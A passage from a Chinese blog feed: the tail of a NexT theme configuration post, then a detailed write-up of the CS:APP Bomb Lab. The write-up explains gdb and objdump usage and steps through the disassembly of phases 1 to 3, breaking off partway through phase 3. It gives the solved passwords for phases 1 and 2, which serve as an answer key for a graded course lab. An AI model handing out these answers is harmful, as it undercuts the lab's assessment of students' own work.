class="attr">algolia_search:</span></span><br><span class="line">  <span class="attr">instant_search:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># PDF</span></span><br><span class="line">  <span class="attr">pdfobject:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Mermaid</span></span><br><span class="line">  <span class="attr">mermaid:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Animate.css</span></span><br><span class="line">  <span class="comment"># Warning: motion won&#x27;t work with animate.css version 3.2.0 or later</span></span><br><span class="line">  <span class="attr">animate_css:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># NProgress.js</span></span><br><span class="line">  <span class="attr">nprogress_js:</span></span><br><span class="line">  <span class="attr">nprogress_css:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Canvas ribbon</span></span><br><span class="line">  <span class="attr">canvas_ribbon:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Assets</span></span><br><span class="line"><span class="comment"># Accelerate delivery of static files using a CDN</span></span><br><span class="line"><span class="attr">css:</span> <span class="string">css</span></span><br><span class="line"><span class="attr">js:</span> <span class="string">js</span></span><br><span class="line"><span class="attr">images:</span> <span class="string">images</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上述配置就是 NexT 主题提供的基本配置。按照你的喜好修改之后，博客网站也就大体成型了。</p>
<p>如果你不满足于此，想要添加更多的功能，可以看 <a href="https://www.superpung.xyz/Blog-Config-1/">下一篇文章</a> 。</p>
]]></content>
      <tags>
        <tag>Notes</tag>
      </tags>
  </entry>
  <entry>
    <title>听说你不会拆弹？</title>
    <url>/Bomb-Lab/</url>
    <content><![CDATA[<p>Bomb Lab: Defusing a Binary Bomb</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<p><em>我经过漫长的分析和调试最终完成了本实验，完成后撰写本文用时约两天，<strong>若参考或转载请注明出处</strong>。</em></p>
<blockquote>
<p>Dr. Evil’s Insidious Bomb, Version 1.1<br>Copyright 2011, Dr. Evil Incorporated. All rights reserved.</p>
<p>LICENSE:</p>
<p>Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the VICTIM) explicit permission to use this bomb (the BOMB).  This is a time limited license, which expires on the death of the VICTIM. The PERPETRATOR takes no responsibility for damage, frustration, insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other harm to the VICTIM.  Unless the PERPETRATOR wants to take credit, that is.  The VICTIM may not distribute this bomb source code to any enemies of the PERPETRATOR.  No VICTIM may debug, reverse-engineer, run “strings” on, decompile, decrypt, or use any other technique to gain knowledge of and defuse the BOMB.  BOMB proof clothing may not be worn when handling this program.  The PERPETRATOR will not apologize for the PERPETRATOR’s poor sense of humor.  This license is null and void where the BOMB is prohibited by law.</p>
</blockquote>
<p>大意为</p>
<blockquote>
<p>Dr.Evil的阴险炸弹，版本1.1<br>版权声明：2011，Dr.Evil公司版权所有。</p>
<p>许可声明：</p>
<p>Dr.Evil公司（犯罪者）特此授予您（受害者）使用该炸弹（BOMB）的明确许可。这是一个有时间限制的许可证，在受害者死亡时到期。破坏者对损坏，沮丧，精神错乱，虫眼，腕管综合症，睡眠不足或对受害者造成的其他伤害概不负责，除非犯罪者想要获得荣誉。受害者不得将此炸弹源代码分发给犯罪者的任何敌人。受害者不得调试，逆向工程，在其上运行“字符串”，反编译，解密或使用任何其他技术来了解和拆除BOMB。处理此程序时，可能不能穿防弹衣。犯罪者不会因犯罪者的幽默感而道歉。在法律禁止BOMB的情况下，此许可无效。</p>
</blockquote>
<p>本实验考察了对汇编语言的分析，对程序控制、过程调用的汇编级实现的理解。故做本实验之前，应先掌握CS:APP第三章《程序的机器级表示》部分。即使你未掌握汇编语言相关的知识，阅读本文后你也会有很大收获。</p>
<p>本文所有操作均基于以下环境：</p>
<ul>
<li>OS: Ubuntu 18.04.4 LTS (Linux ubuntu 5.3.0-46-generic x86_64)</li>
<li>Debugger: GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git</li>
</ul>
<p><em>有关实验的基本介绍参见实验说明。</em></p>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>阅读<code>bomb.c</code>，可以发现：</p>
<ul>
<li><p><code>bomb</code>支持两种输入方式。</p>
<p>为避免重复输入，建议将分析出的password预先存入文本文件<code>passwd.txt</code>中。</p>
</li>
<li><p><code>bomb</code>总共设置了6个<code>phase</code>，每个<code>phase</code>包括：</p>
<ul>
<li><code>read_line()</code>：读取一行作为输入的password；</li>
<li><code>phase_X()</code>：第<code>X</code>个<code>phase</code>调用对应此函数以检验password是否正确；</li>
<li><code>phase_defused()</code>：每个<code>phase</code>在检验密码正确后都会运行此函数。</li>
</ul>
<p>只有password全部正确，拆弹才成功，否则将爆炸：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BOOM!!!</span><br><span class="line">The bomb has blown up.</span><br></pre></td></tr></table></figure>
<p>拆弹的过程，就是通过分析<code>objdump</code>反汇编生成的代码，并利用<code>gdb</code>调试得到每一个<code>phase</code>的password，完成总共6个<code>phase</code>即拆弹成功。</p>
</li>
</ul>
<p>下面是关于<code>objdump</code>和<code>gdb</code>的具体用法：</p>
<ul>
<li><a href="https://man.linuxde.net/objdump"><code>objdump</code>命令</a></li>
<li><a href="https://man.linuxde.net/gdb"><code>gdb</code>命令</a></li>
</ul>
<blockquote>
<p><code>gdb</code>中使用<code>x</code>命令来打印内存的值，格式为“<code>x/&lt;nfu&gt; &lt;addr&gt;</code>”。含义为以<code>&lt;f&gt;</code>格式打印从<code>&lt;addr&gt;</code>开始的<code>&lt;n&gt;</code>个长度单元为<code>&lt;u&gt;</code>的内存值。参数具体含义如下：</p>
<ul>
<li><p><code>&lt;n&gt;</code>：输出单元的个数。</p>
</li>
<li><p><code>&lt;f&gt;</code>：输出格式。</p>
<p><code>s</code> 输出字符串；</p>
<p><code>x</code> 按十六进制格式显示变量；</p>
<p><code>d</code> 按十进制格式显示变量；</p>
<p><code>u</code> 按十六进制格式显示无符号整型；</p>
<p><code>o</code> 按八进制格式显示变量；</p>
<p><code>t</code> 按二进制格式显示变量；</p>
<p><code>a</code> 按十六进制格式显示变量；</p>
<p><code>c</code> 按字符格式显示变量；</p>
<p><code>f</code> 按浮点数格式显示变量。</p>
</li>
<li><p><code>&lt;u&gt;</code>：标明一个单元的长度。</p>
<p><code>b</code>是1个<code>byte</code>；</p>
<p><code>h</code>是2个<code>byte</code>（halfword）；</p>
<p><code>w</code>是4个<code>byte</code>（word）；</p>
<p><code>g</code>是8个<code>byte</code>（giant word）。</p>
</li>
</ul>
</blockquote>
<h1 id="拆弹开始"><a href="#拆弹开始" class="headerlink" title="拆弹开始"></a>拆弹开始</h1><p>首先利用<code>objdump</code>工具反汇编，并将结果重定向存入<code>bomb.s</code>（或<code>bomb.asm</code>、<code>bomb.txt</code>）文件以便分析。（注意此处操作务必在Linux环境下进行，若在Windows或macOS环境下可能会无法生成注释，并可能无法将数值显示为十六进制）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.s</span><br></pre></td></tr></table></figure>
<p>生成的汇编文件包括<strong>标号地址</strong>、<strong>标号名字</strong>、<strong>指令地址</strong>、<strong>指令机器码</strong>以及指令机器码反汇编得到的<strong>指令</strong>等部分。</p>
<p>运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br></pre></td></tr></table></figure>
<p>拆弹开始。</p>
<h1 id="main"><a href="#main" class="headerlink" title="main"></a>main</h1><p>首先分析<code>main</code>函数，找到<code>phase_1</code>对应的汇编语句部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400e32:	e8 67 06 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">400e3a:	e8 a1 00 00 00       	callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:	e8 80 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e44:	bf a8 23 40 00       	mov    $0x4023a8,%edi</span><br><span class="line">400e49:	e8 c2 fc ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>
<p>结合<code>bomb.c</code>可知，程序首先调用<code>read_line</code>函数读取一行字符串（400e32），并将其返回值<code>input</code>从<code>%rax</code>寄存器传入<code>%rdi</code>寄存器（400e37）。（由于<code>read_line</code>函数的作用易知，故本文不再对其进行详细分析）</p>
<p>分析剩余<code>main</code>函数可知，其调用每个<code>phase</code>函数时，<code>input</code>字符串地址都存储于<code>%rdi</code>寄存器中，即**<code>%rdi</code>指向<code>input</code>字符串**。</p>
<p>后续直接分析各<code>phase</code>函数即可。</p>
<h1 id="Phase-1-string"><a href="#Phase-1-string" class="headerlink" title="Phase 1: string"></a>Phase 1: <em>string</em></h1><p><code>phase_1</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq</span><br></pre></td></tr></table></figure>
<hr>
<p>分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br></pre></td></tr></table></figure>
<p>400ee0在<code>%rsp</code>中分配8字节空间压栈</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br></pre></td></tr></table></figure>
<p>400ee4将地址<code>0x402400</code>传入<code>%esi</code>寄存器，直接<code>gdb</code>打断点查看此处内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) b explode_bomb</span><br><span class="line">(gdb) x/s 0x402400</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Breakpoint 1 at 0x40143a</span><br><span class="line">0x402400:       &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>
<p>可以看到地址<code>0x402400</code>指向的是字符串<code>Border relations with Canada have never been better.</code>，推测<code>phase_1</code>的密码就是此字符串（后续称之为“密码串”，对应<code>input</code>字符串为“输入串”）。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br></pre></td></tr></table></figure>
<p>400ee9<span id = "p1">调用<code>strings_not_equal</code>函数</span>（<strong>推测</strong>可能是判断两字符串是否相等，<a href="#equal">点此分析<code>strings_not_equal</code>函数</a>）</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">400efb:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>400eee和400ef0判断<code>%eax</code>（<code>strings_not_equal</code>函数的返回值）是否为0：</p>
<ul>
<li>若为0（输入串和密码串相等）则跳到400ef7（400ee0+0x17），弹出栈并<strong>返回</strong>；</li>
<li>若不为0（输入串和密码串不等）则运行400ef2执行<code>explode_bomb</code>函数使炸弹爆炸</li>
</ul>
<hr>
<p>至此，得知密码串就是password。即<code>phase_1</code>的password为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br></pre></td></tr></table></figure>
<h1 id="Phase2-loop"><a href="#Phase2-loop" class="headerlink" title="Phase2: loop"></a>Phase2: <em>loop</em></h1><p><code>phase_2</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>
<hr>
<p>分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400efc:	55                   	push   %rbp</span><br><span class="line">400efd:	53                   	push   %rbx</span><br><span class="line">400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">400f02:	48 89 e6             	mov    %rsp,%rsi</span><br></pre></td></tr></table></figure>
<p>400efe在<code>%rsp</code>中分配40字节空间压栈，400f02将<code>%rsp</code>地址给<code>%rsi</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br></pre></td></tr></table></figure>
<p>400f05<span id = "p2">调用<code>read_six_numbers</code>函数</span>（<strong>推测</strong>可能是读取6个数字，<a href="#6numbers">点此分析<code>read_six_numbers</code>函数</a>）。</p>
<p>分析完<code>read_six_numbers</code>函数后，可以明确：输入的6个整数依次存放于<code>0(%rsp)</code>、<code>4(%rsp)</code>、<code>8(%rsp)</code>、<code>12(%rsp)</code>、<code>16(%rsp)</code>、<code>20(%rsp)</code>中</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">400f40:	5b                   	pop    %rbx</span><br><span class="line">400f41:	5d                   	pop    %rbp</span><br><span class="line">400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>400f0a和400f0e判断<code>%rsp</code>指向的值（输入的第1个整数）是否为1：</p>
<ul>
<li>若不为1则继续执行400f10使炸弹爆炸；</li>
<li>若为1则跳到400f30（400efc+0x34）把<code>%rsp+4</code>的地址（指向输入的下一个整数）给<code>%rbx</code>，400f35把<code>%rsp+24</code>的地址（指向6个整数结束的位置）给<code>%rbp</code>，再跳回400f17（400efc+0x1b）把<code>%rbx-4</code>的地址（指向当前整数的上一个整数）给<code>%eax</code>，400f1a将<code>%eax</code>的值（上一个整数）乘2，400f1c和400f1e将<code>%eax</code>（上一个整数的2倍）和<code>%rbx</code>指向的值（当前整数）对比：<ul>
<li>若不等则继续执行400f20使炸弹爆炸；</li>
<li>若相等则跳到400f25（400efc+0x29）将<code>%rbx</code>加4（使<code>%rbx</code>指向下一个整数），400f29和400f2c判断<code>%rbx</code>（当前整数位置）是否等于<code>%rbp</code>（6整数结束的位置）：<ul>
<li>若相等则说明6整数判断完毕，继续执行400f2e跳到400f3c弹出栈并返回；</li>
<li>若不等则跳到400f17循环。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>可以看出此部分的循环等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (passwd[<span class="number">0</span>] != <span class="number">1</span>)<span class="comment">// %rsp</span></span><br><span class="line">	explode_bomb();</span><br><span class="line">p_tail = passwd + <span class="number">6</span>;<span class="comment">// %rsp + 24-&gt;%rbp</span></span><br><span class="line"><span class="keyword">for</span> (p_loc = passwd + <span class="number">1</span>; p_loc != p_tail; p_loc++) &#123;<span class="comment">// %rsp + 4-&gt;%rbx; %rbx != %rbp</span></span><br><span class="line">	temp = *(p_loc - <span class="number">1</span>) * <span class="number">2</span>;<span class="comment">// %eax</span></span><br><span class="line">	<span class="keyword">if</span> (*p_loc != temp)</span><br><span class="line">		explode_bomb();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br></pre></td></tr></table></figure>
<p>即判断是否满足“<strong>第一个整数为<code>1</code>，后面5个整数依次为前一个的2倍</strong>”；不满足则使炸弹爆炸</p>
<hr>
<p>至此，得到<code>phase_2</code>的password为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 2 4 8 16 32</span><br></pre></td></tr></table></figure>
<h1 id="Phase-3-switch"><a href="#Phase-3-switch" class="headerlink" title="Phase 3: switch"></a>Phase 3: <em>switch</em></h1><p><code>phase_3</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq</span><br></pre></td></tr></table></figure>
<hr>
<p>分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br></pre></td></tr></table></figure>
<p>400f43在<code>%rsp</code>中分配24字节空间压栈，400f47把<code>%rsp+12</code>的地址给<code>%rcx</code>，400f4c把<code>%rsp+8</code>的地址给<code>%rdx</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdx &#x3D; %rsp + 8</span><br><span class="line">%rcx &#x3D; %rsp + 12</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>
<p>400f51将地址<code>0x4025cf</code>传入<code>%esi</code>寄存器，直接<code>gdb</code>查看此处内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025cf</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x4025cf:       &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>
<p>根据<code>phase_2</code>的经验，结合后续400f5b再次调用了<code>sscanf</code>函数，可以<strong>推测</strong><code>phase_3</code>的password可能是两个整数，中间以1个空格隔开。而且输入的两个整数存储于上述的两个地址中。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">...</span><br><span class="line">400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>400f60和400f63判断<code>%eax</code>是否为1：</p>
<ul>
<li>若不为1则继续执行400f65使炸弹爆炸；</li>
<li>若为1则跳到400f6a（400f43+0x27），和400f6f判断<code>%rsp+8</code>指向的值（输入的第1个整数）是否超过7:<ul>
<li>若超过7则跳到400fad（400f43+0x6a）使炸弹爆炸（由<code>ja</code>针对无符号数可以得知<strong>第一个整数在0～7之间</strong>）；</li>
<li>若不超过7则继续执行</li>
</ul>
</li>
</ul>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br></pre></td></tr></table></figure>
<p>400f71将<code>%rsp+8</code>指向的值（输入的第1个整数）赋给<code>%eax</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br></pre></td></tr></table></figure>
<p>400f75根据<code>%rax</code>的值（输入的第一个整数）跳转到相应地址存放的地址，由于第一个整数在0～7之间，<code>gdb</code>以单字节十六进制查看8*8=64个对应地址：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/64xb 0x402470</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x402470:       0x7c    0x0f    0x40    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x402478:       0xb9    0x0f    0x40    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x402480:       0x83    0x0f    0x40    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x402488:       0x8a    0x0f    0x40    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x402490:       0x91    0x0f    0x40    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x402498:       0x98    0x0f    0x40    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x4024a0:       0x9f    0x0f    0x40    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x4024a8:       0xa6    0x0f    0x40    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure>
<p>由于机器为小端法（little endian），整理后得到输入的第一个整数为0～7时依次对应跳转到的地址依次为：<code>0x400f7c</code>、<code>0x400fb9</code>、<code>0x400f83</code>、<code>0x400f8a</code>、<code>0x400f91</code>、<code>0x400f98</code>、<code>0x400f9f</code>和<code>0x400fa6</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line"> 400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line"> 400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line"> 400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line"> 400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line"> 400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line"> 400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line"> 400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line"> 400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line"> 400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line"> 400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line"> 400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line"> 400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line"> 400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">...</span><br><span class="line"> 400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line"> 400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line"> 400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line"> 400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line"> 400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line"> 400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 